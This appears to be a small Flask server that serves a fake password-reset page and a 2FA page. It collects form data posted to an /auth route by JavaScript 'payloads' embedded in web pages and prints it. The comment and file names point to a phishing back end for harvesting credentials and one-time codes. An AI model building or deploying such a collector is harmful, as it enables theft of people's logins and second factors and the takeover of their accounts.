from flask import Flask
from flask import render_template, send_file, make_response, request

app = Flask(__name__)

#auth is defined below and is defined in the js payload to server in the web. If want to change the objects defines, make sure to chnage it in the payloads that used in the webpages

@app.route("/auth", methods=["POST"])
def auth():
	print(request.form.to_dict())
	return "ok"

@app.route("/")
def index():
	response = make_response(send_file("reset.html"))
	response.headers.add("Access-Control-Allow-Origin", "*")
	return response

@app.route("/login")
def login():
	return send_file("2fa.html")

if __name__ == "__main__":
	app.run()

